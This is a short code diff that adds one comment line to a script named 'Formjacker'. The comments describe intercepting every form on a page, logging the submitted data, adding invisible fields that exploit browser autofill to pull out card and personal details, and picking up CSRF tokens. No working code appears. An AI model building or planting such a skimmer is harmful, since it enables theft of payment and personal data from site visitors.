@@ -2,6 +2,7 @@
   // Formjacker
   /*
     Man-in-the-middle every form on the page so that it sends data via this script. 
+    All forms will submit to this script which will log all the form data and then submit to the original URL.
     Also add in invisible field elements to exploit browser autofill and extract form fill data (CC data, personal details etc) (https://github.com/anttiviljami/browser-autofill-phishing)
     Should automatically pick up CSRF tokens for standard HTML forms. Forms using AJAX requests and CSRF tokens in headers will fail.
   */
